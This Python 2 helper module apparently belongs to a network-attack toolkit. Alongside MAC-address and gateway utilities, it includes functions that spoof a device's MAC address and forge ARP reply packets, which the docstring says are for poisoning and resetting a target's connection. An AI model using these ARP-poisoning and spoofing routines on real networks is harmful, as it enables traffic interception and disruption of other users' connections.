# Copyright (c) 2014-2016 Andrea Baldan
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import sys
import binascii
import random
import subprocess
import struct
import fcntl
import dpkt
from socket import *

# console colors
W = '\033[0m' # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green

def print_counter(counter):
	""" print counter in place """
	sys.stdout.write("[+] Packets [ %d ]\r" % counter)
	sys.stdout.flush()

def print_in_line(string):
	""" print without carriage return """
	sys.stdout.write(string)
	sys.stdout.flush()

def string_to_binary(string):
	""" convert string to binary format """
	return binascii.unhexlify(string)

def binary_to_string(binary):
	""" convert binary to string """
	return binascii.hexlify(binary)

def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue

            return inet_ntoa(struct.pack("<L", int(fields[2], 16)))

def get_mac_addr(dev):
	""" try to retrieve MAC address associated with device """
	s = socket(AF_INET, SOCK_DGRAM)
	info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', dev[:15]))
	s.close()
	return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]

def parse_mac(address):
	""" remove colon inside mac addres, if there's any """
	if len(address) == 12:
		return address
	elif len(address) == 17:
		return address.replace(':', '')
	else:
		raise ValueError('[!] Malformed MAC address')

def fake_mac_address():
	""" generate a fake MAC address """
	prefix = [(random.randint(0x00, 0x7f)) for p in xrange(6)]
	return ':'.join('%02x' % x for x in prefix)

def change_mac(dev, new_mac):
	""" try to change the MAC address associated to the device """
	subprocess.check_call(["ifconfig", "%s" % dev, "up"])
	subprocess.check_call(["ifconfig", "%s" % dev, "hw", "ether", "%s" % new_mac])

def eth_ntoa(buf):
	""" convert a MAC address from binary packed bytes to string format """
	mac_addr = ''
	for intval in struct.unpack('BBBBBB', buf):
		if intval > 15:
			replacestr = '0x'
		else:
			replacestr = 'x'
		mac_addr = ''.join([mac_addr, hex(intval).replace(replacestr, '')])
	return mac_addr

def eth_aton(buf):
	""" convert a MAC address from string to binary packed bytes format """
	addr = ''
	for i in xrange(0, len(buf), 2):
		addr = ''.join([addr, struct.pack('B', int(buf[i: i + 2], 16))],)
	return addr

def build_arp_packet(source_mac, src = None, dst = None):
	""" forge arp packets used to poison and reset target connection """
	arp = dpkt.arp.ARP()
	packet = dpkt.ethernet.Ethernet()
	if not src or not dst:
		return False
	arp.sha = string_to_binary(source_mac)
	arp.spa = inet_aton(dst)
	arp.tha = '\x00' * 6
	arp.tpa = inet_aton(src)
	arp.op = dpkt.arp.ARP_OP_REPLY
	packet.src = string_to_binary(source_mac)
	packet.dst = '\xff' * 6 # broadcast address
	packet.data = arp
	packet.type = dpkt.ethernet.ETH_TYPE_ARP
	return packet

